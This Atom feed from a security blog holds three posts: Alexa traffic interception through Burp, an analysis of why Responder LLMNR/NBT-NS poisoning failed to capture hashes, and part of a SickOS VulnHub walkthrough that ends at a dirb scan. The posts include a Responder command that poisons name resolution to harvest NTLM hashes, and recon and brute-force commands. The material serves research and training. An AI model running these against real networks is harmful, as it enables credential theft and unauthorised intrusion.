<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom"><title>_bullz3ye</title><link href="https://markclayton.github.io/" rel="alternate"></link><link href="https://markclayton.github.io/feeds/all.atom.xml" rel="self"></link><id>https://markclayton.github.io/</id><updated>2017-06-06T06:45:00-05:00</updated><entry><title>Assessing Amazon Alexa's Encrypted Traffic via Kindle Fire</title><link href="https://markclayton.github.io/assessing-amazon-alexas-encrypted-traffic-via-kindle-fire.html" rel="alternate"></link><published>2017-06-06T06:45:00-05:00</published><updated>2017-06-06T06:45:00-05:00</updated><author><name>Mark Clayton</name></author><id>tag:markclayton.github.io,2017-06-06:/assessing-amazon-alexas-encrypted-traffic-via-kindle-fire.html</id><summary type="html">&lt;p&gt;I recently purchased an Amazon Echo to do some research and gain some more experience in the IoT space. Looking around, there has been some interesting work done in assessing the Echo for &lt;a href="https://www.iot-tests.org/2017/02/testing-amazon-echo-dot-alexa-app/"&gt;vulnerabilities&lt;/a&gt;, traffic analysis, &lt;a href="https://vanderpot.com/Clinton_Cook_Paper.pdf"&gt;rooting the device&lt;/a&gt;, and more. Though I haven't had a ton of success yet …&lt;/p&gt;</summary><content type="html">&lt;p&gt;I recently purchased an Amazon Echo to do some research and gain some more experience in the IoT space. Looking around, there has been some interesting work done in assessing the Echo for &lt;a href="https://www.iot-tests.org/2017/02/testing-amazon-echo-dot-alexa-app/"&gt;vulnerabilities&lt;/a&gt;, traffic analysis, &lt;a href="https://vanderpot.com/Clinton_Cook_Paper.pdf"&gt;rooting the device&lt;/a&gt;, and more. Though I haven't had a ton of success yet in finding issues, I did find a bit of useful information that may help others and myself. &lt;/p&gt;
&lt;p&gt;Reading through other's blog post, a common issues seems to be capturing and accessing the Echo's traffic. &lt;a href="https://medium.com/@dweinstein/amazon-echo-dot-explorations-part-1-5f5ae38ffeab"&gt;Somebody&lt;/a&gt; analyzed the browser-based Echo setup process. Another &lt;a href="https://medium.com/@micaksica/exploring-the-amazon-echo-dot-part-1-intercepting-firmware-updates-c7e0f9408b59"&gt;intercepted&lt;/a&gt; Echo traffic using an iptables and DD-WRT to intercept firmware updates. It was the latter article by &lt;a href="https://medium.com/@micaksica/"&gt;@micaksica&lt;/a&gt; that really peaked my interest. I replicated the steps in the post, so I'm analyzing the firmware now (which will be for another post maybe). I'm new to ARM assembly and APK decompiling, but I'm reading a book and some tutorials :) Moving on...&lt;/p&gt;
&lt;p&gt;What peaked my interest about this post was capture Echo's HTTPS traffic. In Wireshark, the majority of the traffic is TLS 1.2 encrypted (as of this post). I would read the article for more information, but long story short Echo didn't want to play nice when proxying TLS connections. &lt;/p&gt;
&lt;p&gt;However, I believe I found a workaround to this issue. The Amazon Alexa software comes installed by default on the Kindle Fire Tablets. To my knowledge it's the same software on the Echo itself, especially when looking at an older Echo firmware update, it showed that the OS version is &lt;code&gt;ro.build.version.fireos=5.5.0.3&lt;/code&gt;. Echo used Kindle Fire OS.&lt;/p&gt;
&lt;p&gt;Using the Kindle Fire tablet, you can setup the device to &lt;a href="https://support.portswigger.net/customer/portal/articles/1841101-configuring-an-android-device-to-work-with-burp"&gt;proxy&lt;/a&gt; app traffic through Burp. Alexa is now just another app on the device. When Alexa is triggered or performs any action I get the traffic through Burp, bypassing the need to deal with secure communications or get the Echo device to play nice with my CA. Alexa and Burp are now friends :) &lt;/p&gt;
&lt;p&gt;To showcase a bit of this I wanted to show an "exchange?" that takes place when asking Alexa something like "&lt;em&gt;what is the weather?&lt;/em&gt;". &lt;/p&gt;
&lt;p&gt;&lt;img alt="echo traffic through burp" src="/images/burp.png"&gt;&lt;/p&gt;
&lt;p&gt;One really interesting thing about this is the call to &lt;code&gt;https://tinytts.amazon.com/&lt;/code&gt;. If you follow that link, it contains the Alexa response in .mp3 format. However, it looks like those files exist for awhile, if not days. This makes me wonder if the responses are stored forever, and if it is possible to capture responses from other users. &lt;/p&gt;
&lt;p&gt;Anyway, that's all I have right now. I figure somebody would find this useful and it'll help them in researching this device. &lt;/p&gt;</content><category term="amazon"></category><category term="echo"></category><category term="research"></category><category term="hacking"></category><category term="kindle"></category></entry><entry><title>Where are my hashes? (Responder Observations)</title><link href="https://markclayton.github.io/where-are-my-hashes-responder-observations.html" rel="alternate"></link><published>2017-03-11T14:52:00-06:00</published><updated>2017-03-11T14:52:00-06:00</updated><author><name>Mark Clayton</name></author><id>tag:markclayton.github.io,2017-03-11:/where-are-my-hashes-responder-observations.html</id><summary type="html">&lt;h1&gt;TL;DR&lt;/h1&gt;
&lt;p&gt;On a recent engagement, it was noticed that Responder and Metasploit's LLMNR and  NBT-NS spoofing modules weren't capturing the hashes like initially expected. Doing some investigation into some of the capabilities of Responder, some observations can be made. A name conflict may arise when poisoning LLMNR or NBT-NS …&lt;/p&gt;</summary><content type="html">&lt;h1&gt;TL;DR&lt;/h1&gt;
&lt;p&gt;On a recent engagement, it was noticed that Responder and Metasploit's LLMNR and  NBT-NS spoofing modules weren't capturing the hashes like initially expected. Doing some investigation into some of the capabilities of Responder, some observations can be made. A name conflict may arise when poisoning LLMNR or NBT-NS requests for known names, not allowing for NTLM authentication to be initiated when requesting an SMB share. Secondly, Internet Explorer 11 has blocked proxy configuration scripts (i.e. WPAD) that require authentication, preventing these tools from initiating Basic authentication. Be sure to look out for this behavior in the field and adjust accordingly. Happy hacking!&lt;/p&gt;
&lt;h3&gt;Disclaimer??&lt;/h3&gt;
&lt;p&gt;This research is not considered to be absolute and complete, these are just observations made that I figured to be worth of a blog post. As I'm always learning and could be way off point, please correct/advise :) I'm far from an expert in the subject matter. Let us get started.&lt;/p&gt;
&lt;p&gt;On a recent internal penetration test, I found myself in a position where capturing Windows credentials seemed to be one of the remaining options of gaining a foothold on the domain. It came down to tools like Responder and Metasploit's LLMNR and NBT-NS poisoning modules. Over the past couple of years, there has some good research on this topic. Collectively, this attack method is known to be very reliable in the security community (at least I think so). Given the amount of information on the internet regarding how these tools and LLMNR/NBT-NS poisoning works, I won't be reiterating the information in this post. Please see references for more information. &lt;/p&gt;
&lt;p&gt;During the engagement I spin up Responder, force WPAD authentication, and sit back while the credentials roll in. &lt;/p&gt;
&lt;p&gt;&lt;img alt="a funny relevant spongebob meme" src="https://cdn.meme.am/cache/instances/folder718/64548718.jpg"&gt;&lt;/p&gt;
&lt;p&gt;Thirty minutes go by with no credentials. A few hours go by ... no credentials. &lt;/p&gt;
&lt;p&gt;&lt;img alt="why you no work" src="https://www.mememaker.net/static/images/memes/4500896.jpg"&gt;&lt;/p&gt;
&lt;p&gt;What could be the problem? Where are the hashes?! Surely, Responder is poisoning the LLMNR and NBT-NS requests effectively.  I try different command line switch configurations, all to no avail. Of course the big question is why. There has to be a explanation for Responder running for hours and never capturing a password. It's off to the lab to do some investigation on Responder. &lt;/p&gt;
&lt;p&gt;Our primary question: Although Responder is poisoning LLMNR and NBT-NS requests, why aren't we seeing credentials? Two very commonly discussed ways Responder capture hashes is by requesting an SMB share, or when IE requests for WPAD. We will be investigating these two functions in this post. &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Attacker Machine (Kali): 10.10.10.101&lt;/li&gt;
&lt;li&gt;Victim (Windows 2012 Server): 10.10.10.102&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;FYI these two hosts are in a Active Directory lab with Victim.&lt;/p&gt;
&lt;p&gt;Spinning up Responder and start seeing some activity.&lt;/p&gt;
&lt;p&gt;&lt;code&gt;root@kali# ./Responder.py -I eth0 -wFf&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img alt="standard_responder_output" src="/images/smb_negotiate_protocol.png"&gt;&lt;/p&gt;
&lt;p&gt;After 10 minutes, still aren't seeing any hashes. Responder is poisoning the LLMNR and NBNS requests generated by the victim, but it isn't until I requests an SMB share with a random name (as described in several tutorials) that we get a hash. Credentials are captured on a query for a name that doesn't currently exists on the network, it must be unique (i.e. \fielshare). As long as the name the victim is querying for exists on the domain, the poisoning tools do not get the opportunity to initiate a NTLM challenge.&lt;/p&gt;
&lt;p&gt;In an engagement, it looks like capturing a hash depends on this condition being "triggered", as Windows is unlikely to request \\fielshare on its own. Analysis shows that the NetBIOS requests generated without "outside assistance" are only for known names, which Responder will not capture hashes despite poisoning responses. This may explain why I didn't much results during the assessment. Perhaps no arbitrary name queries took place on the network. Exactly what prevents Responder from sending a NTLM challenge for an existing name when requesting an SMB share? &lt;/p&gt;
&lt;p&gt;We examine a message exchange that occurs when our victim queries a valid name, in this case the domain PWNLAB. (Side note, these requests were generated by typing "\\" in the victim's Windows Explorer.)&lt;/p&gt;
&lt;p&gt;&lt;img alt="name is in conflict" src="/images/full_wireshark_conflict.png"&gt;&lt;/p&gt;
&lt;p&gt;Here we can see the NBNS broadcast name query for PWNLAB (packet 648). Packet 650 shows Responder poising the request. Finally in packets number 651 (highlighted), we see this "Name is on conflict" message sent from the victim. Let's take a closer look at this packet.&lt;/p&gt;
&lt;p&gt;&lt;img alt="examination of response" src="/images/conflict_detailed.png"&gt;&lt;/p&gt;
&lt;p&gt;Looking at the highlighted row, this shows that the field values are set to indicate a conflict. This name conflict causes the victim to not communicate with the attacker as expected.&lt;/p&gt;
&lt;p&gt;RFC 1002 for NBNS gives some information regarding name conflicts. Check out the RFC itself for more information. &lt;/p&gt;
&lt;p&gt;&lt;a href="https://tools.ietf.org/html/rfc1002"&gt;https://tools.ietf.org/html/rfc1002&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;img alt="nbns response field values" src="/images/nbns_response.png"&gt;&lt;/p&gt;
&lt;p&gt;RFC 4795 for LLMNR states, &lt;/p&gt;
&lt;p&gt;&lt;a href="https://tools.ietf.org/html/rfc4795"&gt;https://tools.ietf.org/html/rfc4795&lt;/a&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Queries with the 'C' bit set are considered advisory, and responders MUST verify the existence of a conflict before acting on it. A responder receiving a query with the 'C' bit set MUST NOT respond. &lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;RFC 1001&lt;/p&gt;
&lt;p&gt;&lt;a href="https://tools.ietf.org/html/rfc1001"&gt;https://tools.ietf.org/html/rfc1001&lt;/a&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Protocol operations sensitive to successive response packets, such as
name conflict detection, are protected from duplicated packets
because they ignore successive packets with the same NetBIOS
information.  Since no state on the responder's node is associated
with a request, the responder just sends the appropriate response
whenever a request packet arrives.  Consequently, duplicate or
delayed request packets have no impact.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;The victim ignores successive packets from nodes where conflict detection arises. One can conclude that the successful packets to set up a TCP and SMB connection do not occur between the attacker and victim as oppose to when a unique (arbitrary) name is requested. Looking back at the previous Wireshark image following message exchange being repeated.&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Victim name query request&lt;/li&gt;
&lt;li&gt;Attacker poisoned name query response&lt;/li&gt;
&lt;li&gt;Victim name conflict detection &lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;Now let's see what happens when the victim requests an arbitrary name (i.e. ramdom), triggered by requested the share \\ramdom. (Side note: haste typing caused "random" to be "ramdom".)&lt;/p&gt;
&lt;p&gt;&lt;img alt="proper_hash_capture" src="/images/smb_negotiate_protocol.png"&gt;&lt;/p&gt;
&lt;p&gt;In the above image 3 observations can be made.&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Packet# 914 - 922: Name query for ramdom followed by poisoned response&lt;/li&gt;
&lt;li&gt;Packet# 923 - 927: Creation of a TCP connection, and following SMB connection attempt&lt;/li&gt;
&lt;li&gt;Packet# 928 - 931: NTLM challenge transactions resulting in the attacker capturing hashes&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;img alt="hash_captured" src="/images/grabbed_hash.png"&gt;&lt;/p&gt;
&lt;p&gt;This is why a trigger is needed, which in a real engagement you can't truly sit back and wait for the credentials to roll in. An attacker must rely on an instance where a unique name is requested, either via simple user error or perhaps forcing a victim to send a name requests for a unique name. These tools are still outstanding, but this explains the instances where no hashes are captured.&lt;/p&gt;
&lt;p&gt;Unless the basic authentication switch (-b) is used, the same trigger applies for Responder's HTTP/HTTPS/FTP module. A successful attack happens upon an arbitrary name (i.e. http://unknowndomain123/).&lt;/p&gt;
&lt;h3&gt;Force WPAD Authentication&lt;/h3&gt;
&lt;p&gt;This leads to another reliable methods Responder uses to grab hashes ... forcing WPAD authentication. This topic has received a lot of discussion and is pretty popular. Once again, multiple articles explain this so I'll will leave it to them (they can explain it better I'm sure). Testing still proves this to be extremely reliable on IE prior to version 11, as you can truly sit back and wait for a victim to open IE. What about IE11 and beyond? On a Windows Server 2012 R2 or Windows 10 environment? During the engagement this wasn't working either, no hashes were captured. Once again we ask the question why.&lt;/p&gt;
&lt;p&gt;We have the same lab setup mentioned above. By default, "Automatically detect settings" is enabled in IE's LAN Settings, and will send requests for WPAD quite frequently. Let's look at the traffic:&lt;/p&gt;
&lt;p&gt;&lt;img alt="wpad_true_poisoning" src="/images/true_poisoning.png"&gt;&lt;/p&gt;
&lt;p&gt;We can see that Responder is poisoning the LLMNR requests, which is soon followed up with our victim requested wpad.dat from our rogue WPAD server. Looking at the TCP stream we can see the following message exchange. &lt;/p&gt;
&lt;p&gt;&lt;img alt="basic auth challenge" src="images/basic_auth_challenge.png"&gt;&lt;/p&gt;
&lt;p&gt;Responder is attempting to get the victim to authenticate, however no Basic Authentication prompt appears. What's stopping this? After doing a little digging we see the following.&lt;/p&gt;
&lt;p&gt;&lt;a href="https://blogs.msdn.microsoft.com/ieinternals/2013/10/11/understanding-web-proxy-configuration/"&gt;https://blogs.msdn.microsoft.com/ieinternals/2013/10/11/understanding-web-proxy-configuration/&lt;/a&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;NOTE: IE11 Deprecates Non-Silent Auth when downloading Proxy Script&lt;/p&gt;
&lt;p&gt;When downloading a proxy configuration script, it’s possible that the server will demand credentials from the client application. A problem arises if the server requests credentials using HTTP BASIC or HTTP DIGEST authentication, as these authentication methods require that the user respond to a credential prompt dialog box. (In contrast, NTLM and Negotiate authenticate silently).&lt;/p&gt;
&lt;p&gt;Many applications cannot handle showing prompts as a part of this workflow and will fail silently. To promote interoperability, IE11 also blocks the use of Proxy Configuration scripts that require authentication.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Responder is attempting to force NTLM or Basic Authentication, but IE11 in its default state now blocks proxy configurations that require authentication. &lt;/p&gt;
&lt;p&gt;In conclusion, if you aren't seeing any hashes after running Responder for awhile time you may want to give it a trigger. Perhaps by supplying a link, or using a man-in-the-middle proxy. This post isn't to diminish Responder or LLMNT/NBNT-NS poisoning tools in any way. These are still very reliable, amazing tools, and the effort in developing them is truly appreciated. Instead, it is to simply highlight some of the reasons why one may not seeing your hashes when testing an environment with more up-to-date hosts. All to make one more aware during engagements. &lt;/p&gt;</content><category term="penetration testing"></category><category term="infosec"></category><category term="responder"></category></entry><entry><title>SickOS Vulnhub Walkthrough</title><link href="https://markclayton.github.io/sickos-vulnhub-walkthrough.html" rel="alternate"></link><published>2016-08-12T08:23:00-05:00</published><updated>2016-08-12T08:23:00-05:00</updated><author><name>Mark Clayton</name></author><id>tag:markclayton.github.io,2016-08-12:/sickos-vulnhub-walkthrough.html</id><summary type="html">&lt;p&gt;I know it's been entirely too long since my last post. Work, study, and family will definitely take up time. I had a break so I figured I'd do a little practice on &lt;a href="https://www.vulnhub.com/"&gt;VulnHub&lt;/a&gt;. I've been meaning to do the SickOS 1.1 VM so I'm glad I finally got …&lt;/p&gt;</summary><content type="html">&lt;p&gt;I know it's been entirely too long since my last post. Work, study, and family will definitely take up time. I had a break so I figured I'd do a little practice on &lt;a href="https://www.vulnhub.com/"&gt;VulnHub&lt;/a&gt;. I've been meaning to do the SickOS 1.1 VM so I'm glad I finally got around to it. Vulnhub has bene doing some absolutely amazing work, pushing out tons of VM's of varying content and difficulty. Shoutout to &lt;a href="https://twitter.com/g0tmi1k"&gt;@g0tmi1k&lt;/a&gt; and the team for the amazing effort.
Lets get started. &lt;/p&gt;
&lt;p&gt;Of course, lets identify which IP our VM has been given. &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@kali:~/Desktop/sickos# netdiscover -r &lt;span class="m"&gt;192&lt;/span&gt;.168.61.0/24
 Currently scanning: Finished!   &lt;span class="p"&gt;|&lt;/span&gt;   Screen View: Unique Hosts                                          

 &lt;span class="m"&gt;4&lt;/span&gt; Captured ARP Req/Rep packets, from &lt;span class="m"&gt;4&lt;/span&gt; hosts.   Total size: &lt;span class="m"&gt;240&lt;/span&gt;                                        
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
 -----------------------------------------------------------------------------
 &lt;span class="m"&gt;192&lt;/span&gt;.168.61.1    &lt;span class="m"&gt;00&lt;/span&gt;:50:56:c0:00:08      &lt;span class="m"&gt;1&lt;/span&gt;      &lt;span class="m"&gt;60&lt;/span&gt;  VMware, Inc.                                         
 &lt;span class="m"&gt;192&lt;/span&gt;.168.61.2    &lt;span class="m"&gt;00&lt;/span&gt;:50:56:f1:59:2e      &lt;span class="m"&gt;1&lt;/span&gt;      &lt;span class="m"&gt;60&lt;/span&gt;  VMware, Inc.                                         
 &lt;span class="m"&gt;192&lt;/span&gt;.168.61.177  &lt;span class="m"&gt;00&lt;/span&gt;:0c:29:eb:3c:73      &lt;span class="m"&gt;1&lt;/span&gt;      &lt;span class="m"&gt;60&lt;/span&gt;  VMware, Inc.                                         
 &lt;span class="m"&gt;192&lt;/span&gt;.168.61.254  &lt;span class="m"&gt;00&lt;/span&gt;:50:56:f9:f6:6c      &lt;span class="m"&gt;1&lt;/span&gt;      &lt;span class="m"&gt;60&lt;/span&gt;  VMware, Inc.                                         

root@kali:~/Desktop/sickos# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Next step...nmap. &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@kali:~/Desktop/sickos# nmap -v -T5 -A &lt;span class="m"&gt;192&lt;/span&gt;.168.61.177
Starting Nmap &lt;span class="m"&gt;7&lt;/span&gt;.12 &lt;span class="o"&gt;(&lt;/span&gt; https://nmap.org &lt;span class="o"&gt;)&lt;/span&gt; at &lt;span class="m"&gt;2016&lt;/span&gt;-08-12 &lt;span class="m"&gt;11&lt;/span&gt;:29 CDT
NSE: Loaded &lt;span class="m"&gt;138&lt;/span&gt; scripts &lt;span class="k"&gt;for&lt;/span&gt; scanning.
NSE: Script Pre-scanning.
Initiating NSE at &lt;span class="m"&gt;11&lt;/span&gt;:29
Completed NSE at &lt;span class="m"&gt;11&lt;/span&gt;:29, &lt;span class="m"&gt;0&lt;/span&gt;.00s elapsed
Initiating NSE at &lt;span class="m"&gt;11&lt;/span&gt;:29
Completed NSE at &lt;span class="m"&gt;11&lt;/span&gt;:29, &lt;span class="m"&gt;0&lt;/span&gt;.00s elapsed
Initiating ARP Ping Scan at &lt;span class="m"&gt;11&lt;/span&gt;:29
Scanning &lt;span class="m"&gt;192&lt;/span&gt;.168.61.177 &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt; port&lt;span class="o"&gt;]&lt;/span&gt;
Completed ARP Ping Scan at &lt;span class="m"&gt;11&lt;/span&gt;:29, &lt;span class="m"&gt;0&lt;/span&gt;.02s elapsed &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt; total hosts&lt;span class="o"&gt;)&lt;/span&gt;
Initiating Parallel DNS resolution of &lt;span class="m"&gt;1&lt;/span&gt; host. at &lt;span class="m"&gt;11&lt;/span&gt;:29
Completed Parallel DNS resolution of &lt;span class="m"&gt;1&lt;/span&gt; host. at &lt;span class="m"&gt;11&lt;/span&gt;:29, &lt;span class="m"&gt;4&lt;/span&gt;.05s elapsed
Initiating SYN Stealth Scan at &lt;span class="m"&gt;11&lt;/span&gt;:29
Scanning &lt;span class="m"&gt;192&lt;/span&gt;.168.61.177 &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="m"&gt;1000&lt;/span&gt; ports&lt;span class="o"&gt;]&lt;/span&gt;
Discovered open port &lt;span class="m"&gt;22&lt;/span&gt;/tcp on &lt;span class="m"&gt;192&lt;/span&gt;.168.61.177
Discovered open port &lt;span class="m"&gt;3128&lt;/span&gt;/tcp on &lt;span class="m"&gt;192&lt;/span&gt;.168.61.177
Completed SYN Stealth Scan at &lt;span class="m"&gt;11&lt;/span&gt;:29, &lt;span class="m"&gt;3&lt;/span&gt;.31s elapsed &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;1000&lt;/span&gt; total ports&lt;span class="o"&gt;)&lt;/span&gt;
Initiating Service scan at &lt;span class="m"&gt;11&lt;/span&gt;:29
Scanning &lt;span class="m"&gt;2&lt;/span&gt; services on &lt;span class="m"&gt;192&lt;/span&gt;.168.61.177
Completed Service scan at &lt;span class="m"&gt;11&lt;/span&gt;:29, &lt;span class="m"&gt;11&lt;/span&gt;.03s elapsed &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;2&lt;/span&gt; services on &lt;span class="m"&gt;1&lt;/span&gt; host&lt;span class="o"&gt;)&lt;/span&gt;
Initiating OS detection &lt;span class="o"&gt;(&lt;/span&gt;try &lt;span class="c1"&gt;#1) against 192.168.61.177&lt;/span&gt;
NSE: Script scanning &lt;span class="m"&gt;192&lt;/span&gt;.168.61.177.
Initiating NSE at &lt;span class="m"&gt;11&lt;/span&gt;:29
Completed NSE at &lt;span class="m"&gt;11&lt;/span&gt;:29, &lt;span class="m"&gt;0&lt;/span&gt;.74s elapsed
Initiating NSE at &lt;span class="m"&gt;11&lt;/span&gt;:29
Completed NSE at &lt;span class="m"&gt;11&lt;/span&gt;:29, &lt;span class="m"&gt;0&lt;/span&gt;.00s elapsed
Nmap scan report &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="m"&gt;192&lt;/span&gt;.168.61.177
Host is up &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;.00051s latency&lt;span class="o"&gt;)&lt;/span&gt;.
Not shown: &lt;span class="m"&gt;997&lt;/span&gt; filtered ports
PORT     STATE  SERVICE    VERSION
&lt;span class="m"&gt;22&lt;/span&gt;/tcp   open   ssh        OpenSSH &lt;span class="m"&gt;5&lt;/span&gt;.9p1 Debian 5ubuntu1.1 &lt;span class="o"&gt;(&lt;/span&gt;Ubuntu Linux&lt;span class="p"&gt;;&lt;/span&gt; protocol &lt;span class="m"&gt;2&lt;/span&gt;.0&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="p"&gt;|&lt;/span&gt; ssh-hostkey: 
&lt;span class="p"&gt;|&lt;/span&gt;   &lt;span class="m"&gt;1024&lt;/span&gt; &lt;span class="m"&gt;09&lt;/span&gt;:3d:29:a0:da:48:14:c1:65:14:1e:6a:6c:37:04:09 &lt;span class="o"&gt;(&lt;/span&gt;DSA&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="p"&gt;|&lt;/span&gt;   &lt;span class="m"&gt;2048&lt;/span&gt; &lt;span class="m"&gt;84&lt;/span&gt;:63:e9:a8:8e:99:33:48:db:f6:d5:81:ab:f2:08:ec &lt;span class="o"&gt;(&lt;/span&gt;RSA&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="p"&gt;|&lt;/span&gt;_  &lt;span class="m"&gt;256&lt;/span&gt; &lt;span class="m"&gt;51&lt;/span&gt;:f6:eb:09:f6:b3:e6:91:ae:36:37:0c:c8:ee:34:27 &lt;span class="o"&gt;(&lt;/span&gt;ECDSA&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="m"&gt;3128&lt;/span&gt;/tcp open   http-proxy Squid http proxy &lt;span class="m"&gt;3&lt;/span&gt;.1.19
&lt;span class="p"&gt;|&lt;/span&gt; http-open-proxy: Potentially OPEN proxy.
&lt;span class="p"&gt;|&lt;/span&gt;_Methods supported: GET HEAD
&lt;span class="p"&gt;|&lt;/span&gt;_http-server-header: squid/3.1.19
&lt;span class="p"&gt;|&lt;/span&gt;_http-title: ERROR: The requested URL could not be retrieved
&lt;span class="m"&gt;8080&lt;/span&gt;/tcp closed http-proxy
MAC Address: &lt;span class="m"&gt;00&lt;/span&gt;:0C:29:EB:3C:73 &lt;span class="o"&gt;(&lt;/span&gt;VMware&lt;span class="o"&gt;)&lt;/span&gt;
Device type: general purpose
Running: Linux &lt;span class="m"&gt;3&lt;/span&gt;.X&lt;span class="p"&gt;|&lt;/span&gt;&lt;span class="m"&gt;4&lt;/span&gt;.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux &lt;span class="m"&gt;3&lt;/span&gt;.2 - &lt;span class="m"&gt;4&lt;/span&gt;.4
Uptime guess: &lt;span class="m"&gt;199&lt;/span&gt;.638 days &lt;span class="o"&gt;(&lt;/span&gt;since Mon Jan &lt;span class="m"&gt;25&lt;/span&gt; &lt;span class="m"&gt;19&lt;/span&gt;:11:43 &lt;span class="m"&gt;2016&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;
Network Distance: &lt;span class="m"&gt;1&lt;/span&gt; hop
TCP Sequence Prediction: &lt;span class="nv"&gt;Difficulty&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;261&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;Good luck!&lt;span class="o"&gt;)&lt;/span&gt;
IP ID Sequence Generation: All zeros
Service Info: OS: Linux&lt;span class="p"&gt;;&lt;/span&gt; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
&lt;span class="m"&gt;1&lt;/span&gt;   &lt;span class="m"&gt;0&lt;/span&gt;.51 ms &lt;span class="m"&gt;192&lt;/span&gt;.168.61.177

NSE: Script Post-scanning.
Initiating NSE at &lt;span class="m"&gt;11&lt;/span&gt;:29
Completed NSE at &lt;span class="m"&gt;11&lt;/span&gt;:29, &lt;span class="m"&gt;0&lt;/span&gt;.00s elapsed
Initiating NSE at &lt;span class="m"&gt;11&lt;/span&gt;:29
Completed NSE at &lt;span class="m"&gt;11&lt;/span&gt;:29, &lt;span class="m"&gt;0&lt;/span&gt;.00s elapsed
Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap &lt;span class="k"&gt;done&lt;/span&gt;: &lt;span class="m"&gt;1&lt;/span&gt; IP address &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt; host up&lt;span class="o"&gt;)&lt;/span&gt; scanned in &lt;span class="m"&gt;21&lt;/span&gt;.33 seconds
           Raw packets sent: &lt;span class="m"&gt;2030&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;91&lt;/span&gt;.680KB&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; Rcvd: &lt;span class="m"&gt;16&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;764B&lt;span class="o"&gt;)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Okay, typically these VMs start off with a web app that contains a few vulnerabilities, however this time it's just SSH and a squid proxy. Given SSH is authenticated, squid proxy it is. After doing some research I figured out that you can use squid proxy to perform a pivot scan against localhost using this proxy to identify ports that were not initially accessible on the remote server. Idea comes from &lt;a href="https://www.rapid7.com/db/modules/auxiliary/scanner/http/squid_pivot_scanning"&gt;here&lt;/a&gt;.  Hopefully now we will be able to identify a web server. &lt;/p&gt;
&lt;p&gt;First we need to configure Firefox to use the proxy. I'm sure most people are aware of this but &lt;a href="https://getfoxyproxy.org/"&gt;FoxyProxy&lt;/a&gt; is an outstanding add-on for quickly adding/switching between proxies. After that's set up we visit localhost via the browser and voilá we have a web app. &lt;/p&gt;
&lt;p&gt;&lt;img alt="proxy_webaccess.png" src="/images/proxy_webaccess.png"&gt;&lt;/p&gt;
&lt;p&gt;Examing the source doesn't give much, so lets do a directory brute force using dirb with the proxy option. &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@kali:~/Desktop/sickos# dirb http://localhost -p &lt;span class="m"&gt;192&lt;/span&gt;.168.61.177:3128

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Fri Aug &lt;span class="m"&gt;12&lt;/span&gt; &lt;span class="m"&gt;11&lt;/span&gt;:45:54 &lt;span class="m"&gt;2016&lt;/span&gt;
URL_BASE: http://localhost/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
PROXY: &lt;span class="m"&gt;192&lt;/span&gt;.168.61.177:3128

-----------------

GENERATED WORDS: &lt;span class="m"&gt;4612&lt;/span&gt;                                                          

---- Scanning URL: http://localhost/ ----
+ http://localhost/cgi-bin/ &lt;span class="o"&gt;(&lt;/span&gt;CODE:403&lt;span class="p"&gt;|&lt;/span&gt;SIZE:285&lt;span class="o"&gt;)&lt;/span&gt;                                                         
+ http://localhost/connect &lt;span class="o"&gt;(&lt;/span&gt;CODE:200&lt;span class="p"&gt;|&lt;/span&gt;SIZE:109&lt;span class="o"&gt;)&lt;/span&gt;                                                          
+ http://localhost/index &lt;span class="o"&gt;(&lt;/span&gt;CODE:200&lt;span class="p"&gt;|&lt;/span&gt;SIZE:21&lt;span class="o"&gt;)&lt;/span&gt;                                                             
